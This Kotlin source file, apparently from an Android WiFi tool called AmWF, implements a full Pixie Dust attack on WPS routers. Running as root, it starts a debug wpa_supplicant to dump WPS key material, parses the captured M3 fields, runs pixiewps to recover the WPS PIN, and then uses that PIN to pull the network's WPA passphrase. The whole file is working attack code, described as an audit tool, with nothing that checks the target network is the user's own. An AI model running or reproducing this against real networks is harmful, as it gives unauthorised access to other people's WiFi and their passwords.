/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import android.content.Context
import android.util.Log
import com.hitomatito.amwf.ShellExecutor
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.File
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout

/**
 * Orquestador del ataque Pixie Dust nativo.
 *
 * Flujo (implementación original de AmWF, GPL-3.0-or-later):
 *   1. Prepara binarios nativos (wpa_supplicant, wpa_cli, pixiewps, libnl) desde assets.
 *   2. Opcionalmente desactiva el WiFi del sistema (svc wifi disable) para liberar la interfaz.
 *   3. Lanza su propio wpa_supplicant con -K -d para volcar claves WPS por debug.
 *   4. Espera el socket de control y verifica respuesta PONG vía wpa_cli.
 *   5. Envía wps_reg con un PIN conocido para provocar el intercambio M3.
 *   6. Parsea los 6 campos M3 (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2).
 *   7. Ejecuta pixiewps con esos argumentos y recupera el PIN WPS.
 *   8. Opcionalmente obtiene el PSK WPA mediante provisión WPS con el PIN hallado.
 *   9. Limpia procesos y restaura el estado del WiFi en [finally].
 *
 * @param context Contexto de la aplicación.
 * @param ioDispatcher Dispatcher para operaciones de E/S (inyectado para testabilidad).
 */
class PixieDustRunner(
    private val context: Context,
    private val ioDispatcher: CoroutineDispatcher = Dispatchers.IO
) {

    private val TAG = "PixieDustRunner"

    // Expresión regular para extraer el PIN WPS de la salida de pixiewps.
    private val PIN_REGEX =
        Regex("""(\[\+\]\s*WPS\s*PIN:\s*|\[\+\]\s*WPS\s*pin:\s*)'?([\d]{4,8})'?""")

    // Validación estricta de BSSID (evita inyección de comandos en shell).
    private val BSSID_REGEX = Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
    // Nombre de interfaz alfanumérico simple (evita inyección).
    private val IFACE_REGEX = Regex("^[a-zA-Z0-9]+$")

    // Límites de tiempo y reintentos.
    private val TOTAL_TIMEOUT_MS = 240_000L
    private val MAX_ATTACK_ROUNDS = 3
    private val SOCKET_WAIT_MS = 8_000L
    private val M3_CAPTURE_TIMEOUT_MS = 25_000L
    private val PSK_EXTRACT_TIMEOUT_MS = 45_000L
    private val PSK_WAIT_MS = 25_000L

    // PIN conocido usado para el registro wps_reg (provoca el intercambio M3).
    private val WPS_REG_PIN_DEFAULT = "12345670"

    /**
     * Ejecuta una auditoría Pixie Dust contra el BSSID dado.
     *
     * @param bssid Dirección MAC del objetivo (validada estrictamente).
     * @param interfaceName Nombre de la interfaz WiFi (por defecto "wlan0").
     * @param ssid SSID de la red (opcional, necesario para extraer el PSK).
     * @param freqMHz Frecuencia en MHz (opcional).
     * @param disableWifiBeforeAttack Si true, desactiva el WiFi del sistema antes de atacar.
     * @return [PixieDustResult] con el resultado de la auditoría.
     */
    suspend fun runAttack(
        bssid: String,
        interfaceName: String = "wlan0",
        ssid: String? = null,
        freqMHz: Int? = null,
        disableWifiBeforeAttack: Boolean = true
    ): PixieDustResult = withContext(ioDispatcher) {
        check(isActive) { "PixieDustRunner cancelled" }

        log("[*] ===== PIXIE DUST ATTACK START =====")
        log("[*] BSSID: $bssid | Interface: $interfaceName | SSID: $ssid | freq: ${freqMHz ?: "unknown"}")
        log("[*] Arch suffix: ${NativeBinaries.archSuffix()}")

        // --- Validaciones de entrada (seguridad: evita inyección de comandos) ---
        if (!BSSID_REGEX.matches(bssid)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Invalid BSSID format: $bssid",
                rawOutput = ""
            )
        }
        if (!IFACE_REGEX.matches(interfaceName)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Invalid interface name: $interfaceName",
                rawOutput = ""
            )
        }

        // --- Preparar binarios nativos ---
        log("[*] Preparing native binaries...")
        if (!NativeBinaries.ensure(context)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Failed to prepare native binaries",
                rawOutput = ""
            )
        }
        if (!NativeBinaries.allBinariesPresent(context)) {
            return@withContext PixieDustResult.Failure(
                bssid = bssid,
                reason = "Native binaries missing (see BINARIES_SETUP.md)",
                rawOutput = ""
            )
        }
        log("[+] Native binaries ready")

        // --- Desactivar WiFi del sistema si se solicita ---
        var wifiDisabledByAttack = false
        if (disableWifiBeforeAttack) {
            log("[*] Disabling system WiFi (svc wifi disable)...")
            val wifiOff = execSu("svc wifi disable", timeoutSeconds = 5)
            log("[*] svc wifi disable -> exit=${wifiOff.exitCode}")
            if (wifiOff.exitCode != 0) {
                log("[!] Warning: svc wifi disable returned non-zero")
            }
            delay(2000)
            wifiDisabledByAttack = true
        }

        var m3Data: M3Parser.M3Data? = null
        var m5m7: M3Parser.M5M7Capture? = null
        var captureReason: String? = null
        var rawOutput = StringBuilder()

        try {
            // Intentar capturar el M3 en varias rondas (frescas claves DH cada ronda).
            for (round in 1..MAX_ATTACK_ROUNDS) {
                check(isActive) { "Cancelled during attack rounds" }
                if (round > 1) {
                    log("[*] M3 capture failed in previous round, restarting supplicant for round $round/$MAX_ATTACK_ROUNDS")
                    delay(1000)
                }

                val supplicantReader = startAttackSupplicant(interfaceName, log = ::log) ?: run {
                    captureReason = "wpa_supplicant socket was not created (SELinux may be blocking it)"
                    break
                }

                val attempt = captureM3(
                    reader = supplicantReader,
                    bssid = bssid,
                    interfaceName = interfaceName,
                    freqMHz = freqMHz,
                    log = ::log,
                    rawOutput = rawOutput
                )
                m3Data = attempt.data
                m5m7 = attempt.m5m7
                captureReason = attempt.failureReason
                rawOutput.append(attempt.rawOutput)

                if (m3Data != null) {
                    log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
                    break
                }
            }

            if (m3Data == null) {
                val reason = captureReason ?: "Not enough data to run Pixie Dust attack"
                log("[-] $reason")
                return@withContext PixieDustResult.Failure(
                    bssid = bssid,
                    reason = reason,
                    rawOutput = rawOutput.toString()
                )
            }

            log("[+] M3 captured:")
            log("    E-Nonce: ${m3Data.enrolleeNonce}")
            log("    PKE (peer key): ${m3Data.peerPublicKey}")
            log("    PKR (own key): ${m3Data.ownPublicKey}")
            log("    AuthKey: ${m3Data.authKey}")
            log("    E-Hash1: ${m3Data.eHash1}")
            log("    E-Hash2: ${m3Data.eHash2}")

            val useMode3 = m5m7 != null && m5m7.hasBoth()
            if (useMode3) {
                val m5m7Local = m5m7
                log("[*] Pixiewps mode 3 (RTL819x): M5=${m5m7Local?.m5Enc?.length ?: 0} hex, M7=${m5m7Local?.m7Enc?.length ?: 0} hex")
            } else {
                val m3Local = m3Data!!
                log("[*] Pixiewps args: ${m3Local.toPixiewpsArgs()}")
            }

            // --- Ejecutar pixiewps ---
            log("[*] Running pixiewps ...")
            val m3Local = m3Data!!
            val pixieCmd = buildPixieCommand(m3Local, m5m7)
            log("[*] Pixiewps command: $pixieCmd")

            val wpsPin = runPixieCommand(pixieCmd, rawOutput)
            log(if (wpsPin != null) "[+] WPS PIN found: $wpsPin" else "[-] WPS pin not found")

            var wpaPsk: String? = null
            if (wpsPin != null && ssid?.isNotBlank() == true) {
                log("[*] Obtaining WPA PSK via WPS provisioning...")
                wpaPsk = obtainWpsPsk(
                    bssid = bssid,
                    iface = interfaceName,
                    ssid = ssid,
                    pin = wpsPin,
                    freqMHz = freqMHz,
                    log = ::log,
                    rawOutput = rawOutput
                )
                if (wpaPsk != null) {
                    log("[+] WPA PSK obtained: $wpaPsk")
                } else {
                    log("[-] WPA PSK not obtained")
                }
            } else if (wpsPin != null) {
                log("[*] Skipping PSK extraction (SSID unknown or empty)")
            }

            if (wpsPin != null) {
                return@withContext PixieDustResult.Success(
                    bssid = bssid,
                    ssid = ssid,
                    wpsPin = wpsPin,
                    wpaPsk = wpaPsk,
                    rawOutput = rawOutput.toString()
                )
            } else {
                return@withContext PixieDustResult.Failure(
                    bssid = bssid,
                    reason = "Target is not vulnerable to the Pixie Dust attack (WPS pin not found)",
                    rawOutput = rawOutput.toString()
                )
            }

        } finally {
            cleanup(wifiDisabledByAttack, ::log)
        }
    }

    /** Cancela cualquier proceso en curso y restaura el estado del WiFi. */
    fun cancel(wifiDisabledByAttack: Boolean, log: (String) -> Unit = {}) {
        cleanup(wifiDisabledByAttack, log)
    }

    // ========================================================================
    // Pasos internos del ataque
    // ========================================================================

    private suspend fun startAttackSupplicant(
        iface: String,
        log: (String) -> Unit
    ): BufferedReader? {
        val ctrlDir = NativeBinaries.ctrlDir()
        log("[*] Preparing ctrl dir: $ctrlDir")
        execSu("rm -rf $ctrlDir 2>/dev/null", timeoutSeconds = 3)
        execSu("mkdir -p $ctrlDir 2>/dev/null", timeoutSeconds = 3)
        execSu("chmod 777 $ctrlDir 2>/dev/null", timeoutSeconds = 3)

        log("[*] Starting own wpa_supplicant (debug -d -K)...")
        val suppCmd = buildSupplicantCommand(iface, ctrlDir)
        log("[*] Supplicant command: $suppCmd")

        val process = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
        val reader = BufferedReader(InputStreamReader(process.inputStream))

        val socketPath = "$ctrlDir/$iface"
        if (!waitForSocket(socketPath, SOCKET_WAIT_MS, log)) {
            log("[-] wpa_supplicant socket not created (SELinux may block): $socketPath")
            process.destroy()
            return null
        }
        if (!waitForInterfaceReady(iface, ctrlDir, log)) {
            log("[-] wpa_supplicant ctrl interface not ready to serve commands")
            process.destroy()
            return null
        }
        return reader
    }

    private fun buildSupplicantCommand(iface: String, ctrlDir: String): String {
        val dir = NativeBinaries.binaryDir(context)
        val supplicant = NativeBinaries.wpaSupplicantAssetName()
        val conf = "$dir/${NativeBinaries.WPA_SUPPLICANT_CONF}"
        return "export LD_LIBRARY_PATH=$dir; $dir/$supplicant -d -Dnl80211,wext,hostapd,wired " +
                "-i $iface -c$conf -K -O$ctrlDir & pid=\$!; ( sleep 110; kill \$pid 2>/dev/null ) & wait \$pid"
    }

    private suspend fun waitForInterfaceReady(
        iface: String,
        ctrlDir: String,
        log: (String) -> Unit
    ): Boolean {
        val dir = NativeBinaries.binaryDir(context)
        val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
        log("[*] Waiting for wpa_supplicant ctrl interface readiness (wpa_cli ping)...")
        val start = System.currentTimeMillis()
        val deadline = start + SOCKET_WAIT_MS
        while (System.currentTimeMillis() < deadline) {
            val r = runSuWithTimeout(
                "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface ping",
                timeoutSeconds = 3
            )
            if (r.exitCode == 0 && r.output.lines().any { it.trim() == "PONG" }) {
                log("[+] wpa_supplicant ctrl interface ready (PONG)")
                return true
            }
            delay(250)
        }
        log("[-] wpa_supplicant ctrl interface not ready (no PONG)")
        return false
    }

    private suspend fun captureM3(
        reader: BufferedReader,
        bssid: String,
        interfaceName: String,
        freqMHz: Int?,
        log: (String) -> Unit,
        rawOutput: StringBuilder
    ): M3Attempt = coroutineScope {
        val maxAttempts = 3
        var lastIncomplete: M3Parser.M3Capture.Incomplete? = null
        var anyRegAccepted = false

        for (attempt in 1..maxAttempts) {
            check(isActive) { "Attack cancelled by user" }
            if (attempt > 1) {
                log("[-] M3 incomplete, retrying wps_reg (attempt $attempt/$maxAttempts)...")
                delay(1000)
            }

            log("[*] Sending wps_reg with PIN $WPS_REG_PIN_DEFAULT...")
            val regResult = sendWpsReg(bssid, interfaceName, freqMHz, log)
            rawOutput.append(regResult.output).append("\n")

            if (!isWpsRegAccepted(regResult)) {
                log("[-] wps_reg not accepted (exit=${regResult.exitCode}), retrying...")
                delay(750)
                continue
            }
            anyRegAccepted = true

            log("[*] Capturing M3 fields...")
            val capture = withTimeout(M3_CAPTURE_TIMEOUT_MS.toLong()) {
                M3Parser.parse(
                    reader = reader,
                    timeoutMs = M3_CAPTURE_TIMEOUT_MS.toLong(),
                    cancelRequested = { !isActive },
                    onLine = { line -> log("[supplicant] $line"); rawOutput.append(line).append('\n') },
                    onM5M7 = { d ->
                        log("[*] WPS-M5/M7 captured: M5=${d.m5Enc?.length ?: 0} hex, M7=${d.m7Enc?.length ?: 0} hex")
                    }
                )
            }

            when (capture) {
                is M3Parser.M3Capture.Complete ->
                    return@coroutineScope M3Attempt(capture.data, null, capture.m5m7, rawOutput.toString())
                is M3Parser.M3Capture.Incomplete -> {
                    lastIncomplete = capture
                    log("[-] M3 capture incomplete: ${capture.capturedCount}/6, missing: ${capture.missing.joinToString()}")
                }
            }
        }

        val reason = when {
            !anyRegAccepted ->
                "wpa_supplicant did not accept wps_reg. Possible causes: interface not ready, WPS disabled, or WPS locked."
            lastIncomplete != null ->
                "WPS data capture incomplete after $maxAttempts attempts " +
                        "(${lastIncomplete.capturedCount}/6 fields, missing: ${lastIncomplete.missing.joinToString(", ")}). " +
                        "Possible causes: weak signal, WPS disabled, or WPS locked."
            else -> "WPS data capture failed"
        }
        return@coroutineScope M3Attempt(null, reason, null, rawOutput.toString())
    }

    private fun sendWpsReg(
        bssid: String,
        iface: String,
        freqMHz: Int?,
        log: (String) -> Unit
    ): ShellExecutor.Result {
        val dir = NativeBinaries.binaryDir(context)
        val ctrlDir = NativeBinaries.ctrlDir()
        val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
        val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
        val cmd = "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface wps_reg $bssid $WPS_REG_PIN_DEFAULT$freqSuffix"
        log("[*] wpa_cli (wps_reg): $cmd")
        return runSuWithTimeout(cmd, timeoutSeconds = 5)
    }

    private fun isWpsRegAccepted(result: ShellExecutor.Result): Boolean =
        result.exitCode == 0 && result.output.lines().any { it.trim() == "OK" }

    private fun runPixieCommand(command: String, rawOutput: StringBuilder): String? {
        log("[*] pixiewps started")
        var wpsPin: String? = null
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))
            val stderrLines = mutableListOf<String>()

            // Leer stderr en paralelo para no bloquear el stdout.
            Thread {
                var errLine: String?
                while (true) {
                    errLine = errReader.readLine()
                    if (errLine == null) break
                    stderrLines.add(errLine)
                    log("[pixiewps-stderr] $errLine")
                }
            }.start()

            var line: String?
            while (true) {
                line = reader.readLine()
                if (line == null) break
                rawOutput.append(line).append('\n')
                log(line)
                val m = PIN_REGEX.find(line)
                if (m != null) {
                    wpsPin = m.groupValues[2]
                }
            }

            val exitCode = process.waitFor()
            log("[*] pixiewps exit code: $exitCode")
            rawOutput.append(stderrLines.joinToString("\n")).append('\n')
            wpsPin
        } catch (e: Exception) {
            Log.e(TAG, "Pixiewps execution failed", e)
            log("[-] Pixiewps execution error: ${e.message}")
            null
        }
    }

    /**
     * Construye el comando de línea para pixiewps a partir de los campos M3 capturados.
     */
    private fun buildPixieCommand(
        m3: M3Parser.M3Data,
        m5m7: M3Parser.M5M7Capture?
    ): String {
        val dir = NativeBinaries.binaryDir(context)
        val pixie = NativeBinaries.pixiewpsAssetName()
        return if (m5m7 != null && m5m7.hasBoth()) {
            "$dir/$pixie ${m5m7.toPixiewpsMode3Args(m3)}"
        } else {
            "$dir/$pixie --force ${m3.toPixiewpsArgs()}"
        }
    }

    private suspend fun obtainWpsPsk(
        bssid: String,
        iface: String,
        ssid: String?,
        pin: String,
        freqMHz: Int?,
        log: (String) -> Unit,
        rawOutput: StringBuilder
    ): String? = withTimeout(PSK_EXTRACT_TIMEOUT_MS.toLong()) {
        try {
            log("[*] ===== WPA PSK EXTRACTION (WPS with PIN $pin) =====")
            val ctrlDir = NativeBinaries.ctrlDir()
            execSu("rm -rf $ctrlDir 2>/dev/null", timeoutSeconds = 3)
            execSu("mkdir -p $ctrlDir 2>/dev/null", timeoutSeconds = 3)
            execSu("chmod 777 $ctrlDir 2>/dev/null", timeoutSeconds = 3)

            log("[*] Starting fresh wpa_supplicant for WPS provisioning...")
            val suppCmd = buildSupplicantCommand(iface, ctrlDir)
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
            val drainer = Thread {
                var supLine: String?
                val supReader = BufferedReader(InputStreamReader(process.inputStream))
                while (true) {
                    supLine = supReader.readLine()
                    if (supLine == null) break
                    log("[supplicant] $supLine")
                }
            }
            drainer.isDaemon = true
            drainer.start()

            val socketPath = "$ctrlDir/$iface"
            if (!waitForSocket(socketPath, SOCKET_WAIT_MS, log)) {
                log("[-] PSK stage: supplicant socket not created")
                process.destroy()
                return@withTimeout null
            }

            val dir = NativeBinaries.binaryDir(context)
            val wpaCli = "./${NativeBinaries.wpaCliAssetName()}"
            fun cli(cmd: String): ShellExecutor.Result =
                runSuWithTimeout("cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface $cmd", timeoutSeconds = 5)

            var netId = "0"
            val addRes = cli("add_network")
            addRes.output.lines().firstOrNull { it.trim().toIntOrNull() != null }?.let { netId = it.trim() }
            log("[+] Network id = $netId")

            val ssidStr = ssid ?: "<unknown>"
            cli("set_network $netId ssid \"$ssidStr\"")
            cli("set_network $netId key_mgmt WPA-PSK")

            val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
            cli("wps_reg $bssid $pin$freqSuffix")
            cli("select_network $netId")

            log("[*] Waiting for WPS provisioning & PSK (up to ${PSK_WAIT_MS / 1000}s)...")
            val deadline = System.currentTimeMillis() + PSK_WAIT_MS
            var psk: String? = null
            while (System.currentTimeMillis() < deadline) {
                val found = listOf(
                    extractPskValue(cli("get_network $netId psk")),
                    extractPskValue(cli("get_network 0 psk"))
                ).firstOrNull { it != null && it.isNotEmpty() }
                if (found != null) {
                    psk = found
                    break
                }
                delay(1000)
            }

            if (psk == null) {
                log("[*] PSK not in control interface — trying save_config...")
                cli("save_config")
                psk = parsePskFromConfig(dir)
            }

            process.destroy()
            if (psk != null) log("[+] WPA PSK: $psk") else log("[-] No PSK obtained from WPS exchange")
            return@withTimeout psk
        } catch (e: Exception) {
            Log.e(TAG, "PSK extraction failed", e)
            log("[-] PSK extraction error: ${e.message}")
            return@withTimeout null
        }
    }

    private fun extractPskValue(result: ShellExecutor.Result): String? {
        if (result.exitCode != 0) return null
        val line = result.output.lines().firstOrNull { l ->
            val t = l.trim()
            t.isNotEmpty() && t != "OK" &&
                    !t.startsWith("Selected interface") &&
                    !t.startsWith("Using interface") &&
                    !t.contains("UNKNOWN COMMAND", ignoreCase = true) &&
                    !t.contains("FAIL", ignoreCase = true)
        } ?: return null
        return line?.trim()?.removePrefix("psk=")?.trim('"')?.trim()?.takeIf { it.isNotBlank() }
    }

    private fun parsePskFromConfig(dir: String): String? {
        val conf = File(dir, NativeBinaries.WPA_SUPPLICANT_CONF)
        if (!conf.exists()) return null
        return try {
            conf.readLines()
                .map { it.trim() }
                .filter { it.startsWith("psk=") }
                .map { it.removePrefix("psk=").trim('"').trim() }
                .firstOrNull { it.isNotBlank() }
        } catch (e: Exception) {
            null
        }
    }

    // ========================================================================
    // Utilidades de shell y limpieza
    // ========================================================================

    /**
     * Ejecuta un comando vía su y retorna el resultado.
     * Reusa ShellExecutor.execRoot (eliminada duplicación con PixieDustViewModel).
     */
    private fun execSu(command: String, timeoutSeconds: Int): ShellExecutor.Result =
        ShellExecutor.execRoot(command, timeoutSeconds * 1000L)

    private fun runSuWithTimeout(command: String, timeoutSeconds: Int): ShellExecutor.Result {
        return try {
            val wrapped =
                "($command & pid=\$!; ( sleep $timeoutSeconds; kill \$pid 2>/dev/null ) & wait \$pid)"
            ShellExecutor.execRoot(wrapped, timeoutSeconds * 1000L)
        } catch (e: Exception) {
            Log.w(TAG, "Command failed/timed out: $command", e)
            ShellExecutor.Result(-1, "", e.message ?: "Unknown error")
        }
    }

    private fun waitForSocket(
        socketPath: String,
        timeoutMs: Long,
        log: (String) -> Unit
    ): Boolean {
        log("[*] Waiting for wpa_supplicant socket: $socketPath ($timeoutMs ms)...")
        val start = System.currentTimeMillis()
        val deadline = start + timeoutMs
        var attempts = 0
        while (System.currentTimeMillis() < deadline) {
            attempts++
            try {
                val r = execSu("test -S $socketPath && echo OK", timeoutSeconds = 2)
                if (r.output.lines().any { it.trim() == "OK" }) {
                    log("[+] Socket ready: $socketPath (attempt $attempts)")
                    return true
                }
            } catch (_: Exception) {}
            if (attempts % 4 == 0) {
                log("[*]   ... still waiting for socket (${System.currentTimeMillis() - start} ms elapsed)")
            }
            Thread.sleep(300)
        }
        log("[-] Socket wait timed out: $socketPath ($attempts attempts)")
        return false
    }

    private fun cleanup(wifiDisabledByAttack: Boolean, log: (String) -> Unit) {
        try {
            val dir = NativeBinaries.binaryDir(context)
            execSu("pkill -9 -f $dir 2>/dev/null", timeoutSeconds = 3)
            execSu("rm -rf ${NativeBinaries.ctrlDir()} 2>/dev/null", timeoutSeconds = 3)
        } catch (_: Exception) {}
        if (wifiDisabledByAttack) {
            val r = execSu("svc wifi enable 2>/dev/null", timeoutSeconds = 5)
            log("[*] Cleanup: svc wifi enable -> exit=${r.exitCode}")
        }
        log("[*] Cleanup done")
    }

    private fun log(message: String) {
        Log.d(TAG, message)
    }

    // ========================================================================
    // Clases de soporte internas
    // ========================================================================

    private data class M3Attempt(
        val data: M3Parser.M3Data?,
        val failureReason: String?,
        val m5m7: M3Parser.M5M7Capture?,
        val rawOutput: String
    )

    companion object {
        private const val TAG = "PixieDustRunner"
    }
}
